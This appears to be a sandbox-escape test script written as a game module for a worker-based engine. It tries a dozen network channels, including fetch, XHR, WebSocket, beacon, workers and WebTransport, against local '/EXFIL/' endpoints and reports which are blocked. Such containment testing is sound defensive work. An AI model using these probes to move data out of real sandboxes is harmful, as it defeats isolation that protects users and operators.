// @title m01 network (worker)
// @engine 0.2
// @capabilities hud audio
const R = {}, V = []; try { addEventListener("securitypolicyviolation", e => V.push(e.violatedDirective.split("-")[0])); } catch (e) {}
const T = (k, f) => { try { const r = f(); R[k] = (r && r.then) ? "async" : "OPEN:" + String(r).slice(0, 20); if (r && r.then) r.then(v => R[k] = "OPEN(async):" + JSON.stringify(v).slice(0, 40), e => R[k] = "blocked:" + (e && e.name || e)); } catch (e) { R[k] = "blocked:" + (e && e.name) + (e && e.name === "Error" ? ":" + String(e.message).slice(0, 80) : ""); } };
const done = (api, ms) => setTimeout(() => { R.csp = V.length; api.end({ score: 0, text: JSON.stringify(R) }); }, ms || 1200);
const X = "http://localhost:8453/EXFIL/", S = "http://127.0.0.1:8453/EXFIL/"; // X = أصل مختلف، S = أصل المضيف نفسه
defineGame({ init(api) {
  for (const [tag, U] of [["x", X], ["s", S]]) {
    T(tag + ".fetch", () => fetch(U + "fetch")); T(tag + ".xhr", () => { const x = new XMLHttpRequest(); x.open("GET", U + "xhr"); x.send(); return "sent"; });
    T(tag + ".ws", () => { const w = new WebSocket(U.replace("http", "ws") + "ws"); w.onerror = () => R[tag + ".ws"] = "blocked:error"; w.onopen = () => R[tag + ".ws"] = "OPEN"; return "pending"; });
    T(tag + ".sse", () => { const e = new EventSource(U + "sse"); e.onerror = () => R[tag + ".sse"] = "blocked:error"; return "pending"; });
    T(tag + ".beacon", () => navigator.sendBeacon(U + "beacon", "x")); T(tag + ".importScripts", () => importScripts(U + "s.js"));
    T(tag + ".worker", () => { const w = new Worker(U + "w.js"); w.onerror = () => R[tag + ".worker"] = "blocked:error"; return "pending"; });
    T(tag + ".sharedworker", () => new SharedWorker(U + "w.js")); T(tag + ".bimage", () => fetch(U + "i.png").then(r => r.blob()).then(createImageBitmap));
  }
  T("broadcast", () => new BroadcastChannel("x")); T("webtransport", () => new WebTransport(X)); T("rtc", () => new RTCPeerConnection());
  done(api, 1500);
}, update() {}, render() {} });
